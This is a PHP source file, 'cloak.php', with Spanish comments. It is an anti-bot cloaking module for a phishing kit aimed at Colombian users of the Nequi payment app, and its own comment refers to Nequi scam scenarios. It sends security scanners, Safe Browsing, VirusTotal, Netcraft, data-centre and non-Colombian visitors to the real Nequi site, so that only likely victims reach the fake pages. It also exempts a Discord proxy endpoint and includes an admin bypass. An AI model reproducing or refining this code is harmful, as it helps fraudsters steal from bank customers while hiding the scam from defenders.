<?php
/**
 * cloak.php — Módulo de Cloaking Anti-Bot (Nequi Edition) - BLINDAJE EXTREMO
 */

// ══════════════════════════════════════════════
// 1. CONFIGURACIÓN
// ══════════════════════════════════════════════
$DECOY_URL = 'https://www.nequi.com.co/'; 
$RATE_LIMIT_MAX = 40; 
$RATE_LIMIT_WIN = 60; 
$TMP_DIR = sys_get_temp_dir(); 
$SECRET_KEY = getenv('SECURITY_KEY') ?: 'nequi_extreme_secret_2026';

// ── BLINDAJE ULTRA: Funciones de Persistencia (Cookies) ──
function cloak_set_cookie($name, $value) {
    global $SECRET_KEY;
    $time = time();
    $signature = hash_hmac('sha256', $name . $value . $time, $SECRET_KEY);
    $cookieValue = $value . '|' . $time . '|' . $signature;
    setcookie($name, $cookieValue, time() + 7200, "/", "", isset($_SERVER['HTTPS']), true);
}

function cloak_get_cookie($name) {
    global $SECRET_KEY;
    if (!isset($_COOKIE[$name])) return null;
    $rawCookie = rawurldecode($_COOKIE[$name]); // Asegurar decodificación de %7C
    $parts = explode('|', $rawCookie);
    if (count($parts) !== 3) return null;
    list($value, $time, $signature) = $parts;
    $expected = hash_hmac('sha256', $name . $value . $time, $SECRET_KEY);
    if (hash_equals($expected, $signature) && (time() - (int)$time) < 86400) { // 24h
        return $value;
    }
    return null;
}

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// ══════════════════════════════════════════════
// BYPASS MAESTRO — Rutas internas u operaciones
// ══════════════════════════════════════════════
$_uri = $_SERVER['REQUEST_URI'] ?? '';
$_bypassPaths = [
    'proxy_discord.php'
];
foreach ($_bypassPaths as $_bp) {
    if (strpos($_uri, $_bp) !== false) {
        return; // ← Salir de cloak SIN aplicar NINGÚN filtro
    }
}

// ── BLINDAJE ULTRA: Validación de Flujo ──
$targetPath = basename($_SERVER['SCRIPT_NAME']);

// Bypass administrativo para pruebas: ?admin=true
$isAdmin = (isset($_GET['admin']) && $_GET['admin'] === 'true') || 
           (isset($_REQUEST['admin']) && $_REQUEST['admin'] === 'true') ||
           (strpos($_SERVER['QUERY_STRING'] ?? '', 'admin=true') !== false) ||
           (cloak_get_cookie('is_admin') === 'true');

if ($isAdmin) {
    cloak_set_cookie('is_admin', 'true');
    cloak_set_cookie('is_human', 'true');
    return; // FIN: Si es admin, no se bloquea nada más
}

$isPublicEntry = in_array($targetPath, ['index.php', 'decoy.php', 'proxy_discord.php']);

if (!$isPublicEntry) {
    // 1. Validar si se detectó comportamiento humano previo
    if (cloak_get_cookie('is_human') !== 'true' && !isset($_SESSION['is_human'])) {
        cloak_send_to_decoy('no_human_interaction', $DECOY_URL);
    }

    // 2. Validar Referer
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    // En Nequi, el proyecto puede estar en un subdirectorio. Solo validamos que haya un referer
    // o que apunte remotamente a la IP/Host.
    if (empty($referer)) {
        // Podríamos bloquear referer vacío en sub-páginas
        cloak_send_to_decoy('invalid_referer', $DECOY_URL);
    }
}

$WHITELIST_IPS = [
    '127.0.0.1',
    '::1',
];

// ══════════════════════════════════════════════
// 2. BLACKLIST DE USER-AGENTS (AMPLIADO)
// ══════════════════════════════════════════════
$BOT_UA_PATTERNS = [
    'bot', 'crawler', 'spider', 'scraper', 'slurp',
    'curl', 'wget', 'libwww', 'lwp-trivial', 'urllib',
    'python-requests', 'python-urllib', 'python-httpx',
    'go-http-client', 'java/', 'okhttp', 'apache-httpclient',
    'ruby', 'perl', 'php/', 'axios', 'node-fetch', 'got/',
    'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot',
    'rogerbot', 'blexbot', 'seznambot', 'sitelock',
    'nikto', 'nessus', 'sqlmap', 'metasploit', 'masscan',
    'nmap', 'dirbuster', 'gobuster', 'whatweb',
    'pingdom', 'uptimerobot', 'statuscake', 'site24x7',
    'monitis', 'freshping', 'hetrix',
    'phantomjs', 'headlesschrome', 'slimerjs',
    'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduckbot',
    'ia_archiver', 'facebookexternalhit', 'twitterbot',
    'fortinet', 'fortiguard', 'google-safety', 'google-inspection',
    'chrome-privacy-sandbox', 'lighthouse', 'headless', 'puppeteer',
    'playwright', 'selenium', 'cyber-threat', 'netcraft', 'virustotal',
    'safebrowsing', 'gsa-crawler', 'google-http-client'
];

// ══════════════════════════════════════════════
// 3. PALABRAS CLAVE DE HOSTNAME (DATA CENTERS)
// ══════════════════════════════════════════════
$DATACENTER_KEYWORDS = [
    'amazon', 'aws', 'akamai', 'azure', 'google', 'cloud', 'digitalocean',
    'ovh', 'linode', 'hetzner', 'softlayer', 'vultr', 'm247', 'data-center',
    'hosting', 'server', 'node', 'dedicated', 'provider', 'fortinet', 'fortigate'
];

// ══════════════════════════════════════════════
// 4. STRINGS SOSPECHOSOS EN HEADERS / URL
// ══════════════════════════════════════════════
$SUSPICIOUS_URL_PATTERNS = [
    '../', '..\\', 'etc/passwd', 'etc/shadow', 'wp-admin', 'wp-login', 
    'wordpress', 'phpmyadmin', 'pma/', 'adminer', '.git/', '.env', 
    'composer.json', 'eval(', 'base64_decode', '<?php', 'select%20', 
    'union%20', 'or%201=1', '<script', 'javascript:', '/shell', '/cmd', '/exec'
];

// ══════════════════════════════════════════════
// 5. FUNCIONES AUXILIARES
// ══════════════════════════════════════════════

function cloak_get_ip(): string
{
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP))
                return $ip;
        }
    }
    return '0.0.0.0';
}

function cloak_send_to_decoy(string $reason, string $decoyUrl): void
{
    $ip = cloak_get_ip();

    // Si debug está activo, mostrar por qué bloqueó en lugar de redirigir
    if (isset($_GET['debug'])) {
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';
        http_response_code(200);
        die("<h1>🛑 DEBUG: Bloqueo Anti-Bot</h1>
             <p><b>Razón:</b> <span style='color:red; font-weight:bold;'>{$reason}</span></p>
             <p><b>IP:</b> {$ip}</p>
             <p><b>Tu User-Agent:</b> <small>{$ua}</small></p>
             <p><b>Sugerencia:</b> Entra con <a href='/?admin=true'>/?admin=true</a> para desbloquearte.</p>");
    }

    http_response_code(503);
    header('Retry-After: 3600');
    
    // Si es una URL externa (empieza por http), redirigir directo
    if ($reason === 'no_human_interaction') {
        // Si no hay iteración humana y no es index, mandar al index oficial o Nequi
        header('Location: ' . $decoyUrl);
    } elseif (strpos($decoyUrl, 'http') === 0) {
        header('Location: ' . $decoyUrl);
    } else {
        header('Location: ../' . $decoyUrl);
    }
    exit;
}

function cloak_rate_limit(string $ip, int $max, int $window, string $tmpDir): bool
{
    $file = $tmpDir . '/rl_' . md5($ip) . '.json';
    $now = time();
    $data = [];

    if (file_exists($file)) {
        $raw = @file_get_contents($file);
        $data = $raw ? json_decode($raw, true) : [];
    }

    $data = array_filter($data, fn($t) => $t > ($now - $window));
    $data[] = $now;

    @file_put_contents($file, json_encode(array_values($data)), LOCK_EX);

    return count($data) > $max;
}

// ══════════════════════════════════════════════
// 6. EJECUCIÓN DE CHEQUEOS
// ══════════════════════════════════════════════

$clientIP = cloak_get_ip();
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

// --- Excepción para Webhooks y Endpoints Internos ---
$isInternalApi = (strpos($targetPath, 'proxy_discord.php') !== false);

if (!$isInternalApi) {
    // ── 6b. Blindaje Extremo: Geo-IP (Solo Colombia 🇨🇴) ──
    $country = $_SERVER['HTTP_X_VERCEL_IP_COUNTRY'] ?? 'CO';
    if ($country !== 'CO' && $country !== 'unknown') {
        cloak_send_to_decoy('geo_block:' . $country, $DECOY_URL);
    }

    // ── 6c. Blindaje Extremo: Solo Móvil 📱 ──
    // Regex simplificado para máxima compatibilidad
    $isMobile = preg_match('/(android|iphone|ipad|mobile|touch|mobi|tablet)/i', $userAgent);
    $isVerifiedHuman = (cloak_get_cookie('is_human') === 'true') || (cloak_get_cookie('is_admin') === 'true');

/*
    if (!$isMobile && !$isVerifiedHuman) {
        // En escenarios de estafa Nequi, a veces llegan de PC pero la app oficial es móvil.
        cloak_send_to_decoy('mobile_only_block', $DECOY_URL);
    }
*/
}

// ── 6d. Whitelist ────────────────────────────────
if (in_array($clientIP, $WHITELIST_IPS, true)) return;

if (!$isInternalApi) {
    // ── 6e. User-Agent sospechoso ───────────────────
    if (strlen($userAgent) < 15) cloak_send_to_decoy('bad_ua_len', $DECOY_URL);

    foreach ($BOT_UA_PATTERNS as $pattern) {
        if (strpos($userAgent, $pattern) !== false) {
            cloak_send_to_decoy('bot_ua:' . $pattern, $DECOY_URL);
        }
    }

    // ── 6f. Detección de Data Centers (DNS Inverso) ──
    $hostname = strtolower(@gethostbyaddr($clientIP));
    foreach ($DATACENTER_KEYWORDS as $kw) {
        if (strpos($hostname, $kw) !== false) {
            cloak_send_to_decoy('datacenter:' . $kw, $DECOY_URL);
        }
    }

    // ── 6g. Validación de Headers ────────────────────
    $acceptLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
    if (empty($acceptLang)) cloak_send_to_decoy('no_lang', $DECOY_URL);
}

// ── 6h. URLs Sospechosas (Auto-Baneo) ────────────
$fullReq = strtolower(($_SERVER['REQUEST_URI'] ?? '') . '?' . ($_SERVER['QUERY_STRING'] ?? ''));
foreach ($SUSPICIOUS_URL_PATTERNS as $pat) {
    if (strpos($fullReq, strtolower($pat)) !== false) {
        cloak_send_to_decoy('suspicious_url_auto_ban:' . $pat, $DECOY_URL);
    }
}

// ── 6i. Rate limiting ────────────────────────────
if (cloak_rate_limit($clientIP, $RATE_LIMIT_MAX, $RATE_LIMIT_WIN, $TMP_DIR)) {
    cloak_send_to_decoy('rate_limit', $DECOY_URL);
}

// ── 6j. Honeypot en POST ─────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['_website_url'])) {
        cloak_send_to_decoy('honeypot', $DECOY_URL);
    }
}

return;
?>
